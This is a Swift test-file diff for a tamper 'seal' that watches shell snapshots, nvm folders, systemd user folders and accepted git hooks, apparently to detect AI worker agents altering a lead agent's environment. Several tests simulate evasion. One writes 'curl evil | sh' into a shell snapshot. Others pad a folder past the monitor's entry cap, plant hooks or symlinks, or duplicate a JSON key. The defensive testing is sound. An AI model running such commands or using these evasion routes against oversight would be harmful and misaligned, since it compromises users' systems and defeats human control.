@@ -37,12 +37,13 @@ struct LinuxSealListTests {
     }
 
     /// Waits (bounded) until a file changed now gets a later ctime than `path`'s: Linux's ctime is as coarse as the
-    /// kernel's tick, and a change in the tick of the last one would keep it.
+    /// kernel's tick, and a change in the tick of the last one would keep it. The probe is outside every watched thing
+    /// (on the same filesystem), so only the write that follows changes what's watched.
     func waitForTheNextTick(after path: String) throws {
         var info = stat()
         guard lstat(path, &info) == 0 else { return }
         let last = Platform.Files.changed(info)
-        let probe = (path as NSString).deletingLastPathComponent + "/.tick-probe-\(UUID().uuidString)"
+        let probe = temp.url("tick-probe-\(UUID().uuidString)").path
         defer { unlink(probe) }
         let deadline = Date().addingTimeInterval(10)
         while Date() < deadline {
@@ -91,14 +92,14 @@ struct LinuxSealListTests {
         let items = list()
         let names = Set(items.map(\.name))
         for (relative, _) in LinuxSealList.homeEntries { #expect(names.contains("~/" + relative), "\(relative) listed") }
-        for name in ["~/x.sh", "/run/user/\(uid)/systemd/transient", "/run/user/\(uid)/systemd/user.control",
+        for name in ["~/x.sh", "/run/user/\(uid)/systemd/transient", "/run/user/\(uid)/systemd/user.control", "/run/user/\(uid)/systemd/user",
                      "/mnt/c/Users/someone/.wslconfig", "/mnt/c/Users/someone/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"] {
             #expect(names.contains(name), "\(name) listed: \(names.sorted())")
         }
         #expect(items.allSatisfy { $0.executes }, "every entry executes")
         #expect(items.allSatisfy { ConfigSeal.executes(key: ConfigSeal.keyPrefix + $0.name) })
         #expect(items.allSatisfy { ConfigSeal.isHome(key: ConfigSeal.keyPrefix + $0.name) }, "each is the node-wide seal's")
-        // Node's version folder, before the unit exists: each of nvm's.
+        // nvm's versions as one listing, so a new one is a change.
         #expect(!names.contains { $0.hasPrefix("~/.nvm/versions/node/") })
 
         let absent = ConfigSeal.fingerprint(ConfigSeal.Watched(name: "absent", path: home + "/nothing-here", kind: .file))
@@ -129,24 +130,27 @@ struct LinuxSealListTests {
         }
     }
 
-    /// Node's version folder: the parent of the unit's node `bin` when the unit exists, else each of nvm's versions.
-    @Test(Self.linux) func nodesVersionFolderIsTheUnitsOrEachOfNvms() throws {
+    /// nvm's node versions are one listing and its alias another: a new version, or the default alias pointed at it, is
+    /// a change (every new shell's `nvm.sh` uses `alias/default`'s node).
+    @Test(Self.linux) func aNewNodeVersionOrTheDefaultAliasIsAChange() throws {
         let home = try home()
         let mounts = try mounts(windows: false)
-        for version in ["v20.1.0", "v22.3.0"] {
-            try FileManager.default.createDirectory(atPath: home + "/.nvm/versions/node/\(version)/bin", withIntermediateDirectories: true)
-        }
-        let nodes = { LinuxSealList.watched(home: home, uid: getuid(), mounts: mounts).filter { $0.name.hasPrefix("~/.nvm/versions/node/") } }
-        #expect(nodes().map(\.name).sorted() == ["~/.nvm/versions/node/v20.1.0", "~/.nvm/versions/node/v22.3.0"])
-        #expect(nodes().allSatisfy { $0.kind == .listing })
-        try write("""
-            [Service]
-            Environment="HOME=\(home)"
-            Environment="PATH=/usr/bin:/bin:\(home)/.local/share/swiftly/bin:\(home)/.nvm/versions/node/v22.3.0/bin"
-
-            """, home + "/.config/systemd/user/vibeswitcher-node.service")
-        #expect(nodes().map(\.name) == ["~/.nvm/versions/node/v22.3.0"])
-        #expect(nodes().map(\.path) == [home + "/.nvm/versions/node/v22.3.0"])
+        try write("aaaa\n", home + "/.nvm/versions/node/v22.16.0/bin/node")
+        try write("v22.16.0\n", home + "/.nvm/alias/default")
+        let list = LinuxSealList.watched(home: home, uid: getuid(), mounts: mounts)
+        let versions = try #require(list.first { $0.name == "~/.nvm/versions/node" })
+        let alias = try #require(list.first { $0.name == "~/.nvm/alias" })
+        #expect(versions.kind == .listing && alias.kind == .listing)
+        #expect(!list.contains { $0.name.hasPrefix("~/.nvm/versions/node/") })
+        let was = prints([versions, alias])
+        try write("bbbb\n", home + "/.nvm/versions/node/v22.16.1/bin/node")
+        let added = prints([versions, alias])
+        #expect(added[versions.name] != was[versions.name], "a new version")
+        #expect(added[alias.name] == was[alias.name])
+        try rewriteKeepingSizeAndTime(home + "/.nvm/alias/default")
+        let pointed = prints([versions, alias])
+        #expect(pointed[alias.name] != added[alias.name], "the default alias rewritten")
+        #expect(pointed[versions.name] == added[versions.name])
     }
 
     /// What the startup files source, written `~/…`, `$HOME/…`, `${HOME}/…` or by the home's own path: each a file.
@@ -275,6 +279,14 @@ struct LinuxSealListTests {
         #expect(look() != nil)
         try write("planted again\n", snapshots + "/snapshot-bash-2-b.sh")
         #expect(look() == nil, "a removed entry back changed")
+        // A read cut at the walk's cap: entries past it are unseen, so it's judged as ever (held), and the hash is the
+        // plain folder read's.
+        recorded = ConfigSeal.hashes(of: [item])
+        try Self.pad(snapshots, ConfigSeal.maxEntries + 1)
+        let cut = ConfigSeal.hashes(of: [item])
+        #expect(ConfigSeal.decode(cut[ConfigSeal.keysKey(of: key)] ?? "")[LinuxSealList.cutEntry] != nil)
+        #expect(cut[key] == ConfigSeal.readFolder(ConfigSeal.Watched(name: "a folder", path: snapshots, kind: .folder)).hash)
+        #expect(look() == nil, "padded past the cap")
         // Not a folder of entries: judged as ever.
         let bin = ConfigSeal.Watched(name: "~/bin", path: home + "/bin", kind: .folder)
         let binKey = ConfigSeal.keyPrefix + bin.name
@@ -283,44 +295,111 @@ struct LinuxSealListTests {
         #expect(LinuxSealList.cameOrWent(key: binKey, recorded: was, now: ConfigSeal.hashes(of: [bin])) == nil)
     }
 
-    /// The lead's accepted hooks (`~/.vibeswitcher/lead/git-hooks`, `.entries`): the baseline written is entries added,
-    /// and its record's `told` flag set by the lead's tool server is no change; a hooks copy or a record changed
-    /// otherwise is.
+    /// `count` empty files in `folder`, named to sort before everything else there.
+    static func pad(_ folder: String, _ count: Int) throws {
+        try FileManager.default.createDirectory(atPath: folder, withIntermediateDirectories: true)
+        for index in 0..<count {
+            let fd = open(folder + String(format: "/0pad%06d", index), O_WRONLY | O_CREAT | O_EXCL, 0o644)
+            try #require(fd >= 0)
+            close(fd)
+        }
+    }
+
+    /// The lead's accepted hooks (`~/.vibeswitcher/lead/git-hooks`, `.entries`): a fresh repository's baseline, as
+    /// GitGuard writes it (shims, copies, record), is entries added, and its record's `told` flag set by the lead's tool
+    /// server is no change. A hook added to a copy, a new repository's folder holding anything but a baseline, a copy
+    /// changed, or a record changed otherwise (also by a key given twice, as GitGuard's decoder reads it) is.
     @Test(Self.linux) func theHooksRecordsToldFlagIsNoChange() throws {
         let home = try home()
-        let store = home + "/.vibeswitcher/lead/git-hooks/0123456789abcdef"
+        let hooks = home + "/.vibeswitcher/lead/git-hooks"
         let item = try #require(LinuxSealList.watched(home: home, uid: getuid()).first { $0.name == "~/.vibeswitcher/lead/git-hooks" })
         #expect(item.kind == .entries)
         let key = ConfigSeal.keyPrefix + item.name
-        let record = { (told: Bool?, run: [String]) throws in
-            var object: [String: Any] = ["folder": "/repo/.git/hooks", "files": [] as [Any], "run": run, "baseline": true]
-            if let told { object["told"] = told }
-            try JSONSerialization.data(withJSONObject: object, options: [.sortedKeys]).write(to: URL(fileURLWithPath: store + "/accepted.json"))
-        }
         let empty = ConfigSeal.hashes(of: [item])
-        try write("#!/bin/sh\n", store + "/copy/hooks/pre-commit")
-        try record(nil, [])
+        // Held: changed, and not as entries come and gone.
+        let held = { (recorded: [String: String]) -> Bool in
+            let now = ConfigSeal.hashes(of: [item])
+            return now[key] != recorded[key] && LinuxSealList.cameOrWent(key: key, recorded: recorded, now: now) == nil
+        }
+        try Self.baseline(in: hooks, store: "0123456789abcdef", hooks: ["pre-commit"])
         let baseline = ConfigSeal.hashes(of: [item])
         #expect(LinuxSealList.cameOrWent(key: key, recorded: empty, now: baseline) != nil, "the baseline: entries added")
-        try record(true, [])
-        #expect(LinuxSealList.cameOrWent(key: key, recorded: baseline, now: ConfigSeal.hashes(of: [item])) != nil, "told set")
-        try record(true, ["pre-commit"])
-        #expect(LinuxSealList.cameOrWent(key: key, recorded: baseline, now: ConfigSeal.hashes(of: [item])) == nil, "the record changed")
-        try record(nil, [])
-        try write("#!/bin/sh\necho planted\n", store + "/copy/hooks/pre-commit")
-        #expect(LinuxSealList.cameOrWent(key: key, recorded: baseline, now: ConfigSeal.hashes(of: [item])) == nil, "the copy changed")
+        try Self.record(in: hooks + "/0123456789abcdef", told: true, run: ["pre-commit"])
+        #expect(!held(baseline), "told set")
+        try Self.record(in: hooks + "/0123456789abcdef", told: true, run: [])
+        #expect(held(baseline), "the record changed")
+        // A key given twice: GitGuard's decoder takes the first, so that's the record's.
+        try Self.record(in: hooks + "/0123456789abcdef", told: nil, run: ["pre-commit"], prefix: "\"run\":[],")
+        #expect(held(baseline), "a key given twice")
+        try Self.record(in: hooks + "/0123456789abcdef", told: nil, run: ["pre-commit"])
+        #expect(!held(baseline))
+        // A hook added to the copy git takes its hooks from runs as the lead: held, shim or not.
+        try installScript("#!/bin/sh\necho planted\n", atPath: hooks + "/0123456789abcdef/copy/hooks/post-merge", mode: 0o700)
+        #expect(held(baseline), "a hook added to an accepted copy")
+        try FileManager.default.removeItem(atPath: hooks + "/0123456789abcdef/copy/hooks/post-merge")
+        try installScript(GitGuard.shim(running: "/elsewhere"), atPath: hooks + "/0123456789abcdef/copy/hooks/post-merge", mode: 0o700)
+        #expect(held(baseline), "a shim added to an accepted copy")
+        try FileManager.default.removeItem(atPath: hooks + "/0123456789abcdef/copy/hooks/post-merge")
+        #expect(!held(baseline))
+        // A shim changed in place.
+        try installScript("#!/bin/sh\necho planted\n", atPath: hooks + "/0123456789abcdef/copy/hooks/pre-commit", mode: 0o700)
+        #expect(held(baseline), "the copy changed")
+        try FileManager.default.removeItem(atPath: hooks + "/0123456789abcdef")
+        try Self.baseline(in: hooks, store: "0123456789abcdef", hooks: ["pre-commit"])
+        #expect(!held(baseline))
+        // A new repository's folder: its baseline comes; one with a hook that isn't a shim, a link for its copy or its
+        // hooks folder, or anything else, doesn't.
+        try Self.baseline(in: hooks, store: "fedcba9876543210", hooks: ["pre-commit", "post-merge"])
+        #expect(!held(baseline), "a second repository's baseline")
+        try installScript("#!/bin/sh\necho planted\n", atPath: hooks + "/fedcba9876543210/copy/hooks/reference-transaction", mode: 0o700)
+        #expect(held(baseline), "a new repository's folder with a hook that isn't a shim")
+        try FileManager.default.removeItem(atPath: hooks + "/fedcba9876543210")
+        try FileManager.default.createDirectory(atPath: hooks + "/fedcba9876543210", withIntermediateDirectories: true)
+        try FileManager.default.createSymbolicLink(atPath: hooks + "/fedcba9876543210/copy", withDestinationPath: temp.url("planted").path)
+        #expect(held(baseline), "a new repository's copy a link")
+        try FileManager.default.removeItem(atPath: hooks + "/fedcba9876543210")
+        try FileManager.default.createDirectory(atPath: hooks + "/fedcba9876543210/copy", withIntermediateDirectories: true)
+        try FileManager.default.createSymbolicLink(atPath: hooks + "/fedcba9876543210/copy/hooks", withDestinationPath: temp.url("planted").path)
+        #expect(held(baseline), "a new repository's hooks folder a link")
+        try FileManager.default.removeItem(atPath: hooks + "/fedcba9876543210")
+        try write("x\n", hooks + "/fedcba9876543210/other")
+        #expect(held(baseline), "a new repository's folder with anything else")
     }
 
-    /// Gated: one look at the list of the account's real home, read only and leaving out `~/.claude` and
-    /// `~/.vibeswitcher`, timed for the inventory. Enabled only with `VIBESWITCHER_SEAL_TIMING_HOME` set to the home
+    /// A repository's accepted hooks as `GitGuard.accept` writes its baseline under `hooks/store`: for each hook, its copy
+    /// in `run` and its shim in `hooks` (running that copy under `VibePaths.root`, as GitGuard names it), then the record.
+    static func baseline(in hooks: String, store: String, hooks names: [String]) throws {
+        let folder = hooks + "/" + store
+        try FileManager.default.createDirectory(atPath: folder + "/copy/hooks", withIntermediateDirectories: true)
+        try FileManager.default.createDirectory(atPath: folder + "/copy/run", withIntermediateDirectories: true)
+        for name in names {
+            try installScript("#!/bin/sh\nexit 0\n", atPath: folder + "/copy/run/" + name, mode: 0o700)
+            let runs = VibePaths.root.appendingPathComponent("lead/git-hooks/\(store)/copy/run/\(name)").path
+            try installScript(GitGuard.shim(running: runs), atPath: folder + "/copy/hooks/" + name, mode: 0o700)
+        }
+        try Self.record(in: folder, told: nil, run: names)
+    }
+
+    /// The record at `folder/accepted.json`, as GitGuard encodes it, with `prefix` (members) put first.
+    static func record(in folder: String, told: Bool?, run: [String], prefix: String = "") throws {
+        let record = GitGuard.Accepted(folder: "/repo/.git/hooks", files: run.map { GitGuard.HookFile(name: $0, sha256: String(repeating: "0", count: 64), executable: true) },
+                                       run: run, baseline: true, told: told)
+        let text = String(decoding: try JSONEncoder().encode(record), as: UTF8.self)
+        try ("{" + prefix + text.dropFirst()).write(toFile: folder + "/accepted.json", atomically: false, encoding: .utf8)
+    }
+
+    /// Gated: one look at the list of the account's real home, read only and leaving out `~/.claude`,
+    /// `~/.vibeswitcher` and `/run/user`, timed for the inventory. Enabled only with `VIBESWITCHER_SEAL_TIMING_HOME` set to the home
     /// the user database gives on the run's command line.
     @Test(.enabled(if: ProcessInfo.processInfo.environment["VIBESWITCHER_SEAL_TIMING_HOME"] != nil, "times a look at the real home's list"))
     func aLookOfTheLinuxListIsTimed() throws {
         let given = try #require(ProcessInfo.processInfo.environment["VIBESWITCHER_SEAL_TIMING_HOME"])
         let account = try #require(getpwuid(getuid()).map { String(cString: $0.pointee.pw_dir) })
         try #require(given == account, "VIBESWITCHER_SEAL_TIMING_HOME must be the user database's home, \(account)")
+        // Never the user's runtime folder (`$XDG_RUNTIME_DIR`'s systemd folders): the plan's Global Constraints.
         let items = LinuxSealList.watched(home: account, uid: getuid()).filter { item in
             !["/.claude", "/.vibeswitcher"].contains { item.path == account + $0 || item.path.hasPrefix(account + $0 + "/") }
+                && !item.name.hasPrefix("/run/user/")
         }
         let start = Date()
         let hashes = ConfigSeal.hashes(of: items)
@@ -329,5 +408,87 @@ struct LinuxSealListTests {
               + String(format: "%.2f s", seconds))
         for item in items { print("seal timing entry: \(item.name) (\(item.kind))") }
         #expect(hashes.filter { ConfigSeal.isWatchedKey($0.key) }.count == items.count)
+    }
+}
+
+/// The seal's Linux list through the vault's own looks (`LeadVault.checkConfig`, the lead's and the app's), in the
+/// fixture vault's scratch home (`book.configHome`).
+struct LinuxSealVaultTests: LeadTeamFixture {
+    let temp = Scratch()
+    let vault: LeadVault
+    init() { vault = Self.newVault(in: temp) }
+
+    var home: String { book.configHome }
+
+    func repo() throws -> String {
+        let url = temp.url("lead")
+        try FileManager.default.createDirectory(at: url, withIntermediateDirectories: true)
+        let root = url.resolvingSymlinksInPath().path
+        for args in [["init", "-q", "-b", "main"], ["config", "user.email", "t@t"], ["config", "user.name", "T"]] { Git.run(args, in: root) }
+        try "one\n".write(toFile: root + "/a.txt", atomically: true, encoding: .utf8)
+        Git.run(["add", "a.txt"], in: root)
+        Git.run(["commit", "-q", "-m", "first"], in: root)
+        try FileManager.default.createDirectory(atPath: root + "/.vibeswitcher", withIntermediateDirectories: true)
+        try "---\nmax_workers: 3\n---\n".write(toFile: root + "/.vibeswitcher/workflow.md", atomically: true, encoding: .utf8)
+        return root
+    }
+
+    func write(_ text: String, _ path: String) throws {
+        try FileManager.default.createDirectory(atPath: (path as NSString).deletingLastPathComponent, withIntermediateDirectories: true)
+        try text.write(toFile: path, atomically: true, encoding: .utf8)
+    }
+
+    /// A team whose lead runs, its seal recorded by the app's look as the scratch home is now.
+    func team() throws -> (root: String, lead: LeadVault) {
+        let root = try repo()
+        let runtime = FakeRuntime()
+        _ = try lead(root, runtime)
+        _ = try vault.checkConfig(root: root)
+        #expect(try vault(for: runtime).checkConfig(root: root) == LeadVault.ConfigCheck())
+        return (root, vault(for: runtime))
+    }
+
+    /// A worker that deletes the lead's shell snapshot, waits for a look, and writes it back changed is held: the
+    /// removed entry is kept through the whole look, not only until it seals.
+    @Test(LinuxSealListTests.linux) func aSnapshotRemovedAndBackChangedIsHeld() throws {
+        let snapshot = home + "/.claude/shell-snapshots/snapshot-bash-1-a.sh"
+        try write("export A=1\n", snapshot)
+        let (root, lead) = try team()
+        try write("export B=2\n", home + "/.claude/shell-snapshots/snapshot-bash-2-b.sh")
+        #expect(try lead.checkConfig(root: root).held.isEmpty, "an entry added")
+        try FileManager.default.removeItem(atPath: snapshot)
+        #expect(try lead.checkConfig(root: root).held.isEmpty, "an entry removed")
+        try write("curl evil | sh\n", snapshot)
+        #expect(try lead.checkConfig(root: root).held == ["~/.claude/shell-snapshots"], "back changed")
+    }
+
+    /// Entries added past the walk's cap would hide the ones after it: held, and a change in place after it too.
+    @Test(LinuxSealListTests.linux) func aSnapshotsFolderPaddedPastItsCapIsHeld() throws {
+        let folder = home + "/.claude/shell-snapshots"
+        try write("export A=1\n", folder + "/snapshot-bash-1-a.sh")
+        let (root, lead) = try team()
+        try LinuxSealListTests.pad(folder, ConfigSeal.maxEntries + 1)
+        #expect(try lead.checkConfig(root: root).held == ["~/.claude/shell-snapshots"], "padded")
+        try write("curl evil | sh\n", folder + "/snapshot-bash-1-a.sh")
+        #expect(try lead.checkConfig(root: root).held == ["~/.claude/shell-snapshots"], "then changed in place")
+    }
+
+    /// A repository's baseline (GitGuard's) comes as no change, and so does its told flag; a hook added to its copy, or
+    /// a new repository's folder whose hook isn't a shim, is held.
+    @Test(LinuxSealListTests.linux) func aHookAddedToTheAcceptedHooksIsHeld() throws {
+        let hooks = home + "/.vibeswitcher/lead/git-hooks"
+        let (root, lead) = try team()
+        let helper = LinuxSealListTests.self
+        try helper.baseline(in: hooks, store: "0123456789abcdef", hooks: ["pre-commit"])
+        #expect(try lead.checkConfig(root: root).held.isEmpty, "the baseline")
+        try helper.record(in: hooks + "/0123456789abcdef", told: true, run: ["pre-commit"])
+        #expect(try lead.checkConfig(root: root).held.isEmpty, "told set")
+        try installScript("#!/bin/sh\necho planted\n", atPath: hooks + "/0123456789abcdef/copy/hooks/reference-transaction", mode: 0o700)
+        #expect(try lead.checkConfig(root: root).held == ["~/.vibeswitcher/lead/git-hooks"], "a hook added")
+        // The app's accept seals it; a new repository's folder with a hook that isn't a shim is held anew.
+        #expect(try vault.checkConfig(root: root).resealed == ["~/.vibeswitcher/lead/git-hooks"])
+        try FileManager.default.createDirectory(atPath: hooks + "/fedcba9876543210/copy/hooks", withIntermediateDirectories: true)
+        try installScript("#!/bin/sh\necho planted\n", atPath: hooks + "/fedcba9876543210/copy/hooks/post-merge", mode: 0o700)
+        #expect(try lead.checkConfig(root: root).held == ["~/.vibeswitcher/lead/git-hooks"], "a planted repository")
     }
 }
